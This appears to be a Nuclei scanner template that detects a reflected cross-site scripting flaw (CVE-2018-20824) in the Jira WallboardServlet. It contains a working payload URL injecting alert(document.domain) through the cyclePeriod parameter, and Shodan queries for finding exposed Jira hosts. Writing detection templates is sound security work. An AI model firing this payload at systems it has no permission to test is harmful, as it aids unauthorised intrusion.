http:
- matchers:
  - part: body
    regex:
    - (?mi)timeout:\salert\(document\.domain\)
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)'
id: CVE-2018-20824
info:
  author: madrobot,dwisiswant0
  classification:
    cpe: cpe:2.3:a:atlassian:jira:*:*:*:*:*:*:*:*
    cve-id: CVE-2018-20824
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.9753
    epss-score: 0.46419
  description: The WallboardServlet resource in Jira before version 7.13.1 allows
    remote attackers to inject arbitrary HTML or JavaScript via a cross-site scripting
    vulnerability in the cyclePeriod parameter.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    max-request: 1
    product: jira
    shodan-query:
    - http.component:"Atlassian Jira"
    - http.component:"atlassian jira"
    - http.component:"atlassian confluence"
    - cpe:"cpe:2.3:a:atlassian:jira"
    vendor: atlassian
  name: Atlassian Jira WallboardServlet <7.13.1 - Cross-Site Scripting
  reference:
  - https://jira.atlassian.com/browse/JRASERVER-69238
  - https://nvd.nist.gov/vuln/detail/CVE-2018-20824
  - https://github.com/ARPSyndicate/kenzer-templates
  - https://github.com/UGF0aWVudF9aZXJv/Atlassian-Jira-pentesting
  - https://github.com/merlinepedra25/nuclei-templates
  remediation: 'Upgrade to Atlassian Jira version 7.13.1 or later to mitigate this
    vulnerability.

    '
  severity: medium
  tags: cve2018,cve,atlassian,jira,xss,vuln
